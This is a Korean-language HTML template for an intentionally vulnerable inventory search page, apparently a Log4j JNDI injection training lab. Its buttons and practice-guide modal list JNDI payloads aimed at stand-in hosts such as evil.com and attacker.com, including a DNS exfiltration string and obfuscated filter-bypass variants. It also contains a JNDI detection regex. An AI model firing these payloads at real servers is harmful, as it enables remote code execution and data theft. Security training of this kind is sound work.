<!DOCTYPE html>
<html lang="ko" xmlns:th="http://www.thymeleaf.org">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>재고 조회 - SecureLogistics</title>

    <!-- Bootstrap 5 CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <!-- Font Awesome Icons -->
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
      rel="stylesheet"
    />
    <!-- DataTables CSS -->
    <link
      href="https://cdn.datatables.net/1.13.4/css/dataTables.bootstrap5.min.css"
      rel="stylesheet"
    />

    <!-- Custom CSS -->
    <style>
      :root {
        --logistics-primary: #2c3e50;
        --logistics-secondary: #3498db;
        --logistics-success: #27ae60;
        --logistics-warning: #f39c12;
        --logistics-danger: #e74c3c;
      }

      body {
        background-color: #f8f9fa;
      }

      .page-header {
        background: linear-gradient(135deg, #27ae60, #2ecc71);
        color: white;
        padding: 2rem 0;
        margin-bottom: 2rem;
      }

      .vulnerability-banner {
        background: linear-gradient(45deg, #e74c3c, #ff6b6b);
        color: white;
        padding: 1.5rem;
        border-radius: 15px;
        margin-bottom: 2rem;
        box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
      }

      .search-container {
        background: white;
        border-radius: 20px;
        padding: 2rem;
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
        margin-bottom: 2rem;
      }

      .search-input {
        border-radius: 50px;
        padding: 1rem 1.5rem;
        border: 3px solid #e9ecef;
        font-size: 1.1rem;
        transition: all 0.3s ease;
      }

      .search-input:focus {
        border-color: var(--logistics-success);
        box-shadow: 0 0 0 0.3rem rgba(39, 174, 96, 0.25);
        transform: scale(1.02);
      }

      .search-btn {
        border-radius: 50px;
        padding: 1rem 2rem;
        font-weight: bold;
        font-size: 1.1rem;
        transition: all 0.3s ease;
      }

      .search-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
      }

      .filter-card {
        background: white;
        border-radius: 15px;
        padding: 1.5rem;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
        margin-bottom: 1.5rem;
        transition: transform 0.3s ease;
      }

      .filter-card:hover {
        transform: translateY(-3px);
      }

      .result-card {
        background: white;
        border-radius: 15px;
        padding: 1.5rem;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
        margin-bottom: 1rem;
        transition: all 0.3s ease;
      }

      .result-card:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
      }

      .stock-status {
        padding: 0.5rem 1rem;
        border-radius: 20px;
        font-weight: bold;
        font-size: 0.9rem;
      }

      .stock-high {
        background: #d4edda;
        color: #155724;
      }
      .stock-medium {
        background: #fff3cd;
        color: #856404;
      }
      .stock-low {
        background: #f8d7da;
        color: #721c24;
      }
      .stock-out {
        background: #f5c6cb;
        color: #721c24;
      }

      .attack-pattern-btn {
        margin: 0.2rem;
        border-radius: 20px;
        font-size: 0.85rem;
        transition: all 0.3s ease;
      }

      .attack-pattern-btn:hover {
        transform: scale(1.05);
      }

      .real-time-search {
        border-left: 4px solid var(--logistics-success);
        background: #f8fff9;
        padding: 1rem;
        margin: 1rem 0;
        border-radius: 5px;
      }

      .vulnerability-demo {
        background: linear-gradient(45deg, #ff9a56, #ff6b6b);
        border-radius: 15px;
        padding: 1.5rem;
        margin: 1rem 0;
      }

      .log-monitor {
        background: #1a1a1a;
        color: #00ff00;
        border-radius: 10px;
        padding: 1rem;
        font-family: 'Courier New', monospace;
        font-size: 0.85rem;
        max-height: 300px;
        overflow-y: auto;
        margin: 1rem 0;
      }

      .category-tag {
        background: var(--logistics-secondary);
        color: white;
        padding: 0.3rem 0.8rem;
        border-radius: 15px;
        font-size: 0.8rem;
        margin: 0.2rem;
        display: inline-block;
      }

      .advanced-search {
        background: #f8f9fa;
        border-radius: 10px;
        padding: 1.5rem;
        margin-bottom: 1rem;
      }
    </style>
  </head>
  <body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm">
      <div class="container">
        <a class="navbar-brand" href="/">
          <i class="fas fa-truck-moving me-2"></i>
          SecureLogistics
        </a>
        <button
          class="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarNav"
        >
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav me-auto">
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="fas fa-home me-1"></i>대시보드
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/warehouse">
                <i class="fas fa-warehouse me-1"></i>입고관리
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/shipping">
                <i class="fas fa-shipping-fast me-1"></i>출고관리
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link active" href="/inventory">
                <i class="fas fa-boxes me-1"></i>재고조회
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/tracking">
                <i class="fas fa-route me-1"></i>배송추적
              </a>
            </li>
          </ul>
          <ul class="navbar-nav">
            <li class="nav-item dropdown">
              <a
                class="nav-link dropdown-toggle"
                href="#"
                role="button"
                data-bs-toggle="dropdown"
              >
                <i class="fas fa-cog me-1"></i>시스템관리
              </a>
              <ul class="dropdown-menu">
                <li>
                  <a class="dropdown-item" href="/admin/users">직원관리</a>
                </li>
                <li>
                  <a class="dropdown-item" href="/admin/logs">시스템로그</a>
                </li>
                <li><hr class="dropdown-divider" /></li>
                <li>
                  <a class="dropdown-item text-warning" href="/vulnerable">
                    <i class="fas fa-bug me-1"></i>취약점 실습
                  </a>
                </li>
              </ul>
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <!-- Page Header -->
    <section class="page-header">
      <div class="container">
        <div class="row align-items-center">
          <div class="col-md-8">
            <h1 class="display-5 fw-bold">
              <i class="fas fa-search me-3"></i>실시간 재고 조회 시스템
            </h1>
            <p class="lead">통합 검색으로 모든 재고 정보를 한눈에 확인하세요</p>
          </div>
          <div class="col-md-4 text-end">
            <div class="text-white">
              <h4><i class="fas fa-cubes me-2"></i>총 재고</h4>
              <h2 class="fw-bold">15,847</h2>
              <small>품목</small>
            </div>
          </div>
        </div>
      </div>
    </section>

    <div class="container">
      <!-- Vulnerability Banner -->
      <div class="vulnerability-banner">
        <div class="row align-items-center">
          <div class="col-md-8">
            <h3 class="mb-2">
              <i class="fas fa-shield-alt me-2"></i>
              Log4j 취약점 실습 환경
            </h3>
            <p class="mb-0">
              이 검색 시스템은 Log4j CVE-2021-44228 취약점 학습을 위해
              의도적으로 취약하게 구성되었습니다.
            </p>
            <small
              >🎯 검색창에 JNDI 공격 패턴을 입력하여 실시간으로 취약점을 실습할
              수 있습니다.</small
            >
          </div>
          <div class="col-md-4 text-end">
            <button
              class="btn btn-outline-light btn-lg"
              onclick="showAttackGuide()"
            >
              <i class="fas fa-graduation-cap me-2"></i>실습 가이드
            </button>
          </div>
        </div>
      </div>

      <!-- Main Search Section -->
      <div class="search-container">
        <div class="text-center mb-4">
          <h3 class="fw-bold">
            <i class="fas fa-search-location me-2 text-success"></i>
            스마트 재고 검색
          </h3>
          <p class="text-muted">
            상품명, SKU, 카테고리, 공급업체 등 모든 정보를 통합 검색합니다
          </p>
        </div>

        <!-- Main Search Bar -->
        <div class="row justify-content-center mb-4">
          <div class="col-md-8">
            <div class="input-group input-group-lg">
              <input
                type="text"
                class="form-control search-input"
                id="mainSearchInput"
                placeholder="재고 검색어를 입력하세요... (예: 삼성 갤럭시, SKU-12345, 스마트폰)"
              />
              <button
                class="btn btn-success search-btn"
                onclick="performMainSearch()"
              >
                <i class="fas fa-search me-2"></i>검색
              </button>
            </div>
            <div class="form-text text-center mt-2">
              <span class="text-warning">⚠️ Log4j 취약점 실습:</span>
              JNDI 패턴을 입력하여 보안 취약점을 테스트해보세요
            </div>
          </div>
        </div>

        <!-- Attack Pattern Quick Buttons -->
        <div class="text-center mb-4">
          <h6 class="text-muted mb-3">
            🚨 취약점 테스트 패턴 (클릭하여 빠른 입력)
          </h6>
          <div class="d-flex flex-wrap justify-content-center gap-2">
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${jndi:ldap://evil.com/exploit}')"
            >
              기본 LDAP 공격
            </button>
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${jndi:rmi://malicious.server/payload}')"
            >
              RMI 공격
            </button>
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${jndi:dns://attacker.com/exfiltrate}')"
            >
              DNS 공격
            </button>
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${${lower:jndi}:${lower:ldap}://bypass.com/exploit}')"
            >
              우회 공격
            </button>
            <button
              class="btn btn-outline-warning btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('정상검색어')"
            >
              정상 검색
            </button>
          </div>
        </div>

        <!-- Real-time Search Alert -->
        <div class="real-time-search" id="searchAlert" style="display: none">
          <div class="row align-items-center">
            <div class="col-md-8">
              <h6 class="mb-1">
                <i class="fas fa-bolt text-warning me-2"></i>
                실시간 검색 활성화
              </h6>
              <p class="mb-0">입력하는 모든 내용이 실시간으로 로깅됩니다.</p>
            </div>
            <div class="col-md-4 text-end">
              <span class="badge bg-success">Log4j 활성</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Advanced Search & Filters -->
      <div class="row">
        <div class="col-lg-8">
          <!-- Advanced Search -->
          <div class="filter-card">
            <h5 class="mb-3"><i class="fas fa-sliders-h me-2"></i>고급 검색</h5>
            <div class="advanced-search">
              <div class="row">
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">카테고리</label>
                    <select class="form-select" id="categoryFilter">
                      <option value="">전체 카테고리</option>
                      <option value="electronics">전자제품</option>
                      <option value="appliances">가전제품</option>
                      <option value="furniture">가구</option>
                      <option value="clothing">의류</option>
                    </select>
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">재고 상태</label>
                    <select class="form-select" id="stockFilter">
                      <option value="">모든 상태</option>
                      <option value="high">충분 (100개 이상)</option>
                      <option value="medium">보통 (50-99개)</option>
                      <option value="low">부족 (10-49개)</option>
                      <option value="out">품절 (0개)</option>
                    </select>
                  </div>
                </div>
              </div>
              <div class="row">
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">공급업체</label>
                    <input
                      type="text"
                      class="form-control"
                      id="supplierFilter"
                      placeholder="공급업체명 입력..."
                    />
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">가격 범위</label>
                    <div class="input-group">
                      <input
                        type="number"
                        class="form-control"
                        id="priceMin"
                        placeholder="최소"
                      />
                      <span class="input-group-text">~</span>
                      <input
                        type="number"
                        class="form-control"
                        id="priceMax"
                        placeholder="최대"
                      />
                    </div>
                  </div>
                </div>
              </div>
              <div class="text-center">
                <button
                  class="btn btn-primary me-2"
                  onclick="performAdvancedSearch()"
                >
                  <i class="fas fa-filter me-1"></i>필터 적용
                </button>
                <button
                  class="btn btn-outline-secondary"
                  onclick="resetFilters()"
                >
                  <i class="fas fa-undo me-1"></i>초기화
                </button>
              </div>
            </div>
          </div>

          <!-- Search Results -->
          <div class="filter-card">
            <div class="d-flex justify-content-between align-items-center mb-3">
              <h5 class="mb-0">
                <i class="fas fa-list me-2"></i>검색 결과
                <span class="badge bg-primary ms-2" id="resultCount">3</span>
              </h5>
              <div class="btn-group btn-group-sm">
                <button
                  class="btn btn-outline-secondary"
                  onclick="sortResults('name')"
                >
                  <i class="fas fa-sort-alpha-down me-1"></i>이름순
                </button>
                <button
                  class="btn btn-outline-secondary"
                  onclick="sortResults('stock')"
                >
                  <i class="fas fa-sort-numeric-down me-1"></i>재고순
                </button>
                <button
                  class="btn btn-outline-secondary"
                  onclick="sortResults('price')"
                >
                  <i class="fas fa-sort-amount-down me-1"></i>가격순
                </button>
              </div>
            </div>

            <!-- Sample Results -->
            <div id="searchResults">
              <div class="result-card">
                <div class="row align-items-center">
                  <div class="col-md-2">
                    <img
                      src="https://via.placeholder.com/100x100?text=상품"
                      class="img-fluid rounded"
                      alt="상품이미지"
                    />
                  </div>
                  <div class="col-md-6">
                    <h6 class="fw-bold">삼성 갤럭시 S24 Ultra</h6>
                    <p class="text-muted mb-1">SKU: SAM-GAL-S24U-001</p>
                    <div class="mb-2">
                      <span class="category-tag">스마트폰</span>
                      <span class="category-tag">삼성</span>
                    </div>
                    <small class="text-muted">공급업체: 삼성전자</small>
                  </div>
                  <div class="col-md-2 text-center">
                    <span class="stock-status stock-high">재고 충분</span>
                    <h5 class="fw-bold mt-2">247개</h5>
                  </div>
                  <div class="col-md-2 text-end">
                    <h5 class="fw-bold text-primary">1,200,000원</h5>
                    <button class="btn btn-outline-primary btn-sm w-100">
                      <i class="fas fa-info-circle me-1"></i>상세보기
                    </button>
                  </div>
                </div>
              </div>

              <div class="result-card">
                <div class="row align-items-center">
                  <div class="col-md-2">
                    <img
                      src="https://via.placeholder.com/100x100?text=상품"
                      class="img-fluid rounded"
                      alt="상품이미지"
                    />
                  </div>
                  <div class="col-md-6">
                    <h6 class="fw-bold">LG 올레드 TV 65인치</h6>
                    <p class="text-muted mb-1">SKU: LG-OLED-65C3-001</p>
                    <div class="mb-2">
                      <span class="category-tag">TV</span>
                      <span class="category-tag">LG</span>
                    </div>
                    <small class="text-muted">공급업체: LG전자</small>
                  </div>
                  <div class="col-md-2 text-center">
                    <span class="stock-status stock-low">재고 부족</span>
                    <h5 class="fw-bold mt-2 text-warning">12개</h5>
                  </div>
                  <div class="col-md-2 text-end">
                    <h5 class="fw-bold text-primary">2,500,000원</h5>
                    <button class="btn btn-outline-primary btn-sm w-100">
                      <i class="fas fa-info-circle me-1"></i>상세보기
                    </button>
                  </div>
                </div>
              </div>

              <div class="result-card">
                <div class="row align-items-center">
                  <div class="col-md-2">
                    <img
                      src="https://via.placeholder.com/100x100?text=상품"
                      class="img-fluid rounded"
                      alt="상품이미지"
                    />
                  </div>
                  <div class="col-md-6">
                    <h6 class="fw-bold">애플 맥북 프로 16인치</h6>
                    <p class="text-muted mb-1">SKU: APP-MBP-16-M3-001</p>
                    <div class="mb-2">
                      <span class="category-tag">노트북</span>
                      <span class="category-tag">애플</span>
                    </div>
                    <small class="text-muted">공급업체: 애플코리아</small>
                  </div>
                  <div class="col-md-2 text-center">
                    <span class="stock-status stock-medium">재고 보통</span>
                    <h5 class="fw-bold mt-2">67개</h5>
                  </div>
                  <div class="col-md-2 text-end">
                    <h5 class="fw-bold text-primary">3,200,000원</h5>
                    <button class="btn btn-outline-primary btn-sm w-100">
                      <i class="fas fa-info-circle me-1"></i>상세보기
                    </button>
                  </div>
                </div>
              </div>
            </div>

            <!-- Pagination -->
            <nav class="mt-4">
              <ul class="pagination justify-content-center">
                <li class="page-item disabled">
                  <a class="page-link" href="#">이전</a>
                </li>
                <li class="page-item active">
                  <a class="page-link" href="#">1</a>
                </li>
                <li class="page-item">
                  <a class="page-link" href="#">2</a>
                </li>
                <li class="page-item">
                  <a class="page-link" href="#">3</a>
                </li>
                <li class="page-item">
                  <a class="page-link" href="#">다음</a>
                </li>
              </ul>
            </nav>
          </div>
        </div>

        <!-- Sidebar -->
        <div class="col-lg-4">
          <!-- Vulnerability Demo -->
          <div class="vulnerability-demo text-white">
            <h5 class="fw-bold mb-3">
              <i class="fas fa-bug me-2"></i>취약점 실시간 모니터링
            </h5>
            <p class="mb-3">검색할 때마다 Log4j 로깅이 실행됩니다</p>
            <button
              class="btn btn-outline-light w-100"
              onclick="toggleLogMonitor()"
            >
              <i class="fas fa-terminal me-2"></i>로그 모니터 토글
            </button>
          </div>

          <!-- Log Monitor -->
          <div class="filter-card">
            <h6 class="fw-bold mb-3">
              <i class="fas fa-terminal me-2"></i>실시간 로그 모니터
            </h6>
            <div class="log-monitor" id="logMonitor">
              <div>
                [2025-05-27 15:30:15] INFO - Inventory search system initialized
              </div>
              <div>
                [2025-05-27 15:30:16] DEBUG - Log4j vulnerability demo mode
                active
              </div>
              <div>
                [2025-05-27 15:30:17] INFO - Search page accessed from IP:
                127.0.0.1
              </div>
              <div>
                [2025-05-27 15:30:18] WARN - Vulnerability monitoring enabled
              </div>
            </div>
            <div class="text-center mt-2">
              <button
                class="btn btn-outline-success btn-sm"
                onclick="clearLogs()"
              >
                <i class="fas fa-trash me-1"></i>로그 지우기
              </button>
            </div>
          </div>

          <!-- Quick Stats -->
          <div class="filter-card">
            <h6 class="fw-bold mb-3">
              <i class="fas fa-chart-pie me-2"></i>재고 현황
            </h6>
            <div class="row text-center">
              <div class="col-6 mb-3">
                <div class="text-success">
                  <i class="fas fa-check-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">12,456</h4>
                  <small>충분</small>
                </div>
              </div>
              <div class="col-6 mb-3">
                <div class="text-warning">
                  <i class="fas fa-exclamation-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">2,134</h4>
                  <small>부족</small>
                </div>
              </div>
              <div class="col-6">
                <div class="text-danger">
                  <i class="fas fa-times-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">567</h4>
                  <small>품절</small>
                </div>
              </div>
              <div class="col-6">
                <div class="text-info">
                  <i class="fas fa-plus-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">690</h4>
                  <small>신규</small>
                </div>
              </div>
            </div>
          </div>

          <!-- Popular Searches -->
          <div class="filter-card">
            <h6 class="fw-bold mb-3">
              <i class="fas fa-fire me-2"></i>인기 검색어
            </h6>
            <div class="d-flex flex-wrap gap-1">
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('삼성')"
              >
                삼성
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('LG')"
              >
                LG
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('애플')"
              >
                애플
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('스마트폰')"
              >
                스마트폰
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('노트북')"
              >
                노트북
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('TV')"
              >
                TV
              </button>
              <button
                class="btn btn-outline-danger btn-sm"
                onclick="quickSearch('${jndi:ldap://test.com}')"
              >
                🚨 테스트
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Attack Guide Modal -->
    <div class="modal fade" id="attackGuideModal" tabindex="-1">
      <div class="modal-dialog modal-xl">
        <div class="modal-content">
          <div class="modal-header bg-danger text-white">
            <h5 class="modal-title">
              <i class="fas fa-graduation-cap me-2"></i>Log4j 취약점 실습 가이드
            </h5>
            <button
              type="button"
              class="btn-close btn-close-white"
              data-bs-dismiss="modal"
            ></button>
          </div>
          <div class="modal-body">
            <div class="row">
              <div class="col-md-6">
                <h6 class="fw-bold text-danger">🎯 실습 목표</h6>
                <ul>
                  <li>Log4j JNDI Injection 취약점 이해</li>
                  <li>다양한 공격 패턴 실습</li>
                  <li>실시간 로그 모니터링</li>
                  <li>보안 취약점 탐지 방법 학습</li>
                </ul>

                <h6 class="fw-bold text-primary mt-4">📋 실습 절차</h6>
                <ol>
                  <li>아래 공격 패턴 중 하나 선택</li>
                  <li>검색창에 복사하여 붙여넣기</li>
                  <li>검색 실행</li>
                  <li>로그 모니터에서 결과 확인</li>
                  <li>다른 패턴으로 반복 실습</li>
                </ol>
              </div>
              <div class="col-md-6">
                <h6 class="fw-bold text-warning">⚠️ 공격 패턴 목록</h6>
                <div class="bg-dark text-light p-3 rounded">
                  <code>
                    # 기본 LDAP 공격<br />
                    ${jndi:ldap://evil.com/exploit}<br /><br />

                    # RMI 공격<br />
                    ${jndi:rmi://malicious.server/payload}<br /><br />

                    # DNS 데이터 유출<br />
                    ${jndi:dns://attacker.com/exfiltrate}<br /><br />

                    # 우회 기법<br />
                    ${${lower:jndi}:${lower:ldap}://bypass.com/exploit}<br /><br />

                    # 환경변수 우회<br />
                    ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}<br /><br />

                    # 중첩 우회<br />
                    ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}
                  </code>
                </div>
              </div>
            </div>

            <div class="alert alert-danger mt-4">
              <h6 class="fw-bold">🚨 중요 주의사항</h6>
              <ul class="mb-0">
                <li>이는 <strong>교육 목적</strong>의 실습 환경입니다</li>
                <li>
                  실제 운영 시스템에서는 <strong>절대 사용하지 마세요</strong>
                </li>
                <li>
                  이 환경은 <strong>격리된 네트워크</strong>에서만 사용해야
                  합니다
                </li>
                <li>
                  실습 후에는
                  <strong>반드시 Log4j를 안전한 버전으로 업데이트</strong>하세요
                </li>
              </ul>
            </div>

            <div class="bg-info text-white p-3 rounded mt-3">
              <h6 class="fw-bold">💡 학습 포인트</h6>
              <p class="mb-0">
                각 패턴을 실행할 때마다 로그 모니터를 확인하여 Log4j가 어떻게
                JNDI 문자열을 처리하는지 관찰해보세요. 실제 공격에서는 외부
                서버로 연결을 시도하게 됩니다.
              </p>
            </div>
          </div>
          <div class="modal-footer">
            <button
              type="button"
              class="btn btn-secondary"
              data-bs-dismiss="modal"
            >
              닫기
            </button>
            <button
              type="button"
              class="btn btn-warning"
              onclick="startGuidedTour()"
            >
              <i class="fas fa-play me-1"></i>가이드 투어 시작
            </button>
            <button
              type="button"
              class="btn btn-danger"
              onclick="location.href='/vulnerable'"
            >
              <i class="fas fa-bug me-1"></i>전용 실습실로 이동
            </button>
          </div>
        </div>
      </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>

    <!-- Custom JavaScript -->
    <script>
      let searchCount = 0;
      let logMonitorVisible = true;

      // 페이지 로드 시 초기화
      document.addEventListener('DOMContentLoaded', function () {
        initializePage();
        setupRealTimeSearch();
        startLogSimulation();
      });

      // 페이지 초기화
      function initializePage() {
        // 검색창 포커스
        document.getElementById('mainSearchInput').focus();

        // 검색 알림 표시
        document.getElementById('searchAlert').style.display = 'block';

        // 애니메이션 효과
        animateCards();
      }

      // 카드 애니메이션
      function animateCards() {
        const cards = document.querySelectorAll(
          '.filter-card, .result-card, .vulnerability-banner'
        );
        cards.forEach((card, index) => {
          setTimeout(() => {
            card.style.opacity = '0';
            card.style.transform = 'translateY(20px)';
            card.style.transition = 'all 0.6s ease';
            setTimeout(() => {
              card.style.opacity = '1';
              card.style.transform = 'translateY(0)';
            }, 100);
          }, index * 100);
        });
      }

      // 🚨 메인 검색 기능 (Log4j 취약점 실습의 핵심)
      function performMainSearch() {
        const searchTerm = document.getElementById('mainSearchInput').value;

        if (!searchTerm.trim()) {
          alert('검색어를 입력해주세요.');
          return;
        }

        searchCount++;
        addLogEntry(`[검색 ${searchCount}] 검색어: "${searchTerm}"`);

        // 🚨 Log4j 취약점: API 호출로 서버 로깅 트리거
        fetch(
          `/api/boards/search?q=${encodeURIComponent(
            searchTerm
          )}&type=inventory`
        )
          .then((response) => response.json())
          .then((data) => {
            updateSearchResults(data, searchTerm);

            // JNDI 패턴 감지
            if (detectJNDIPattern(searchTerm)) {
              showVulnerabilityAlert(searchTerm);
              addLogEntry(
                `[보안경고] JNDI 패턴 감지: ${searchTerm}`,
                'warning'
              );
            }
          })
          .catch((error) => {
            console.error('검색 오류:', error);
            addLogEntry(`[오류] 검색 실패: ${error.message}`, 'error');

            // 임시 결과 표시
            showMockResults(searchTerm);
          });
      }

      // 🚨 고급 검색 (여러 필터 조합)
      function performAdvancedSearch() {
        const filters = {
          category: document.getElementById('categoryFilter').value,
          stock: document.getElementById('stockFilter').value,
          supplier: document.getElementById('supplierFilter').value,
          priceMin: document.getElementById('priceMin').value,
          priceMax: document.getElementById('priceMax').value,
        };

        addLogEntry('[고급검색] 필터 적용 중...');

        // 🚨 Log4j 취약점: 필터 값들을 조합하여 로깅
        const filterString = Object.entries(filters)
          .filter(([key, value]) => value)
          .map(([key, value]) => `${key}:${value}`)
          .join(', ');

        fetch('/api/boards/search/advanced', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(filters),
        })
          .then((response) => response.json())
          .then((data) => {
            addLogEntry(`[고급검색] 필터: ${filterString}`);
            updateSearchResults(data, '고급검색');
          })
          .catch((error) => {
            addLogEntry(`[오류] 고급검색 실패: ${error.message}`, 'error');
            showMockResults('고급검색');
          });
      }

      // 공격 패턴 삽입
      function insertAttackPattern(pattern) {
        document.getElementById('mainSearchInput').value = pattern;

        // 자동 검색 실행
        setTimeout(() => {
          performMainSearch();
        }, 500);

        addLogEntry(`[패턴삽입] ${pattern.substring(0, 50)}...`, 'warning');
      }

      // 빠른 검색
      function quickSearch(term) {
        document.getElementById('mainSearchInput').value = term;
        performMainSearch();
      }

      // JNDI 패턴 감지
      function detectJNDIPattern(input) {
        const jndiPatterns = [
          /\$\{jndi:/i,
          /ldap:\/\//i,
          /rmi:\/\//i,
          /dns:\/\//i,
          /\$\{.*:.*\}/i,
        ];

        return jndiPatterns.some((pattern) => pattern.test(input));
      }

      // 취약점 경고 표시
      function showVulnerabilityAlert(input) {
        const alertHtml = `
                <div class="alert alert-danger alert-dismissible fade show" role="alert">
                    <div class="row align-items-center">
                        <div class="col-md-8">
                            <h6 class="fw-bold mb-1">
                                <i class="fas fa-exclamation-triangle me-2"></i>
                                Log4j 취약점 패턴 감지!
                            </h6>
                            <p class="mb-1">입력된 검색어에서 JNDI 패턴이 발견되었습니다.</p>
                            <small>패턴: <code>${input.substring(0, 100)}${
          input.length > 100 ? '...' : ''
        }</code></small>
                        </div>
                        <div class="col-md-4 text-end">
                            <button class="btn btn-outline-danger btn-sm" onclick="showAttackGuide()">
                                <i class="fas fa-info-circle me-1"></i>상세 정보
                            </button>
                        </div>
                    </div>
                    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                </div>
            `;

        const container = document.querySelector('.container');
        container.insertAdjacentHTML('afterbegin', alertHtml);
      }

      // 실시간 검색 설정
      function setupRealTimeSearch() {
        const searchInput = document.getElementById('mainSearchInput');
        let timeout;

        searchInput.addEventListener('input', function (e) {
          clearTimeout(timeout);
          const value = e.target.value;

          if (value.length > 2) {
            timeout = setTimeout(() => {
              addLogEntry(`[실시간] 입력: "${value}"`);

              // JNDI 패턴 실시간 감지
              if (detectJNDIPattern(value)) {
                addLogEntry(`[실시간경고] JNDI 패턴 감지중...`, 'warning');
              }
            }, 500);
          }
        });

        // 엔터키 검색
        searchInput.addEventListener('keypress', function (e) {
          if (e.key === 'Enter') {
            performMainSearch();
          }
        });
      }

      // 로그 추가
      function addLogEntry(message, type = 'info') {
        const logMonitor = document.getElementById('logMonitor');
        const timestamp = new Date().toLocaleTimeString();
        const className =
          type === 'warning'
            ? 'text-warning'
            : type === 'error'
            ? 'text-danger'
            : 'text-success';

        const logEntry = document.createElement('div');
        logEntry.className = className;
        logEntry.innerHTML = `[${timestamp}] ${message}`;

        logMonitor.appendChild(logEntry);
        logMonitor.scrollTop = logMonitor.scrollHeight;

        // 로그 개수 제한
        if (logMonitor.children.length > 50) {
          logMonitor.removeChild(logMonitor.firstChild);
        }
      }

      // 로그 시뮬레이션
      function startLogSimulation() {
        const simulationMessages = [
          'Log4j vulnerability demo system ready',
          'Search monitoring active',
          'JNDI pattern detection enabled',
          'Real-time logging initialized',
        ];

        simulationMessages.forEach((msg, index) => {
          setTimeout(() => {
            addLogEntry(msg);
          }, index * 1000);
        });
      }

      // 모의 결과 표시
      function showMockResults(searchTerm) {
        document.getElementById('resultCount').textContent = '3';
        addLogEntry(`[결과] "${searchTerm}" 검색 완료 - 3건 발견`);

        // 취약점 패턴인 경우 특별 처리
        if (detectJNDIPattern(searchTerm)) {
          addLogEntry('[취약점] JNDI 룩업 시도가 로깅되었습니다', 'warning');
          addLogEntry(
            '[취약점] 실제 환경에서는 외부 서버 연결이 발생합니다',
            'warning'
          );
        }
      }

      // 검색 결과 업데이트
      function updateSearchResults(data, searchTerm) {
        if (data && data.content) {
          document.getElementById('resultCount').textContent =
            data.totalElements || 0;
          addLogEntry(
            `[결과] "${searchTerm}" 검색 완료 - ${
              data.totalElements || 0
            }건 발견`
          );
        } else {
          showMockResults(searchTerm);
        }
      }

      // 모달 및 기타 함수들
      function showAttackGuide() {
        new bootstrap.Modal(document.getElementById('attackGuideModal')).show();
      }

      function toggleLogMonitor() {
        const logMonitor = document.getElementById('logMonitor');
        logMonitorVisible = !logMonitorVisible;
        logMonitor.style.display = logMonitorVisible ? 'block' : 'none';

        addLogEntry(
          logMonitorVisible ? '로그 모니터 활성화' : '로그 모니터 비활성화'
        );
      }

      function clearLogs() {
        document.getElementById('logMonitor').innerHTML = '';
        addLogEntry('로그 모니터 초기화됨');
      }

      function resetFilters() {
        document.getElementById('categoryFilter').value = '';
        document.getElementById('stockFilter').value = '';
        document.getElementById('supplierFilter').value = '';
        document.getElementById('priceMin').value = '';
        document.getElementById('priceMax').value = '';
        addLogEntry('[필터] 모든 필터 초기화');
      }

      function sortResults(type) {
        addLogEntry(`[정렬] ${type} 기준으로 정렬`);
        // 실제 정렬 로직은 여기에 구현
      }

      function startGuidedTour() {
        bootstrap.Modal.getInstance(
          document.getElementById('attackGuideModal')
        ).hide();

